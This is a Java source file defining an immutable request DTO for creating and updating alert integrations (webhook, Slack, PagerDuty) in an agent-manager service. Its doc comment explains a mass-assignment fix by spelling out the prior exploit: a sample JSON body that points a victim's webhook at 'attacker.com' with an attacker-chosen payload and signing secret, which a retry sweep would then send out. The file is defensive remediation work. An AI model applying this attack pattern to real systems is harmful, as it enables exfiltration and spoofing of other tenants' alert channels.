package com.operativus.agentmanager.control.dto;

import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Pattern;
import jakarta.validation.constraints.Size;

/**
 * Domain Responsibility: Inbound DTO for create / update on
 *   {@link com.operativus.agentmanager.core.entity.AlertIntegration}.
 *
 *   <p><strong>Mass-assignment fix.</strong> The previous controller bound
 *   {@code @RequestBody AlertIntegration} — the raw JPA entity. {@code id} is
 *   application-managed and the service only UUID-generated when the body's id
 *   was null/blank. Worse, the entity exposes server-managed retry-state setters
 *   ({@code setRetryCount}, {@code setLastFailureAt}, {@code setLastError},
 *   {@code setNextRetryAt}, {@code setPendingPayload}, {@code setPendingEventId})
 *   that were also bound from the body — turning a simple mass-assignment into
 *   a webhook-payload injection vector:
 *
 *   <ol>
 *     <li>Attacker POSTs with {"id":"&lt;victim-integration-id&gt;", "endpointUrl":
 *         "http://attacker.com/...", "signingSecret":"&lt;attacker-secret&gt;",
 *         "pendingPayload":"&lt;arbitrary JSON&gt;", "nextRetryAt":"&lt;past&gt;",
 *         "retryCount":0} (the existing service-layer
 *         {@code orgId} override happens, but id/retry-state were unprotected).
 *     <li>{@code save()} merges → UPDATES the victim's row. Victim's webhook
 *         endpoint is now attacker's URL with attacker's signing secret.
 *     <li>The scheduled {@code redispatchPendingFailures} sweep walks rows whose
 *         {@code nextRetryAt} has elapsed and POSTs the {@code pendingPayload} to
 *         the configured endpoint. With attacker-controlled payload + URL +
 *         signing secret, this is full outbound exfiltration / spoofing on the
 *         victim's alert channel.
 *   </ol>
 *
 *   <p>This DTO exposes only the operator-settable surface (name, type, endpointUrl,
 *   enabled, signingSecret). The controller maps onto a fresh entity (CREATE) or
 *   the loaded entity (UPDATE), with id, orgId, retry-state always server-managed.
 *
 * State: Immutable record.
 */
public record AlertIntegrationRequest(
        @NotBlank @Size(max = 255) String name,
        @NotBlank
        @Pattern(regexp = "WEBHOOK|SLACK|PAGERDUTY",
                message = "type must be one of WEBHOOK, SLACK, PAGERDUTY")
        String type,
        @NotBlank @Size(max = 4096) String endpointUrl,
        boolean enabled,
        /**
         * Optional HMAC-SHA256 signing secret. A null inbound value means "do not
         * touch" (preserve the existing secret on update); an empty-string value
         * means "clear it". This matches the existing service-layer semantics on
         * {@code updateIntegration} — see
         * {@code AlertIntegrationService.updateIntegration} for the precedent.
         */
        @Size(max = 1024) String signingSecret
) {}
